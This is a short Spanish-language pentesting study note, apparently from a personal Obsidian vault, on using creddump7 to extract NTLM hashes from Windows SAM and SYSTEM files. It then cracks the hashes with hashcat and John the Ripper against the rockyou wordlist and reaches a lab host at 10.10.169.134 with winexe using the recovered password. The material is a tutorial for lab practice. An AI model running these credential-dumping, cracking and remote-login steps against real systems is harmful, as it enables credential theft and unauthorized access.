Creddump7 es una herramienta utilizada para extraer credenciales y hashes de contraseñas de sistemas Windows. Se enfoca principalmente en la extracción de información de los archivos de sistema SAM y SYSTEM, que contienen las credenciales almacenadas localmente en un equipo Windows.

```
https://github.com/Tib3rius/creddump7
```

# Instalación
Para instalarlo primero clonamos el repositorio
```
git clone https://github.com/Tib3rius/creddump7
```
![[Pasted image 20240722095232.png]]

Ahora instalaremos la biblioteca de `pycryptodome` para poder ejecutar creddump7
```
pip3 install pycryptodome
```
![[Pasted image 20240722095724.png]]

Ahora ejecutamos el siguiente comando y habremos obtenido los hashes NTLM del sistema
```
python3 creddump7/pwdump.py SYSTEM SAM
```
![[Pasted image 20240722095822.png]]

Ahora copiaremos todas las credenciales en un .txt y las crackearemos con hashcat o john the ripper![[Pasted image 20240722095942.png]]

Y ahora la crackeamos con [[Hashcat]]
```
hashcat -m 1000 --force hash.txt /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240722100225.png]]
![[Pasted image 20240722100258.png]]

Ahora podemos volver a listar la salida de hashcat con el siguiente comando
```
hashcat -m 1000 --show hash.txt
```
![[Pasted image 20240722101519.png]]

Tambien podemos usar [[John The Ripper]]
```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240722101320.png]]

Ahora podriamos acceder por rdp con las credenciales obtenidas
```
winexe -U 'admin%password123' //10.10.169.134 cmd.exe
```
![[Pasted image 20240722101759.png]]